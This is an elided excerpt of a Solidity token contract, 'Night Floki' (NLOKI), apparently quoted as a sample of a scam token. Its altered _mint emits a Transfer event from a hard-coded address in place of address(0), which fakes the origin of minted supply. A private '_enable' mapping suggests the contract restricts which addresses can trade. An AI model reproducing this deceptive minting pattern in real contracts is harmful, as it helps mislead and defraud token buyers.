...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0x82084A627E8F02292F9744e043AB092223390770), account, amount);
    }
...
contract NightFloki is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('Night Floki','NLOKI') {
        _mint(0x3d39EB6Ea4BC53410e3079878F31B911568331B5, 1000000 *10**18);
        _enable[0x3d39EB6Ea4BC53410e3079878F31B911568331B5] = true;
    }
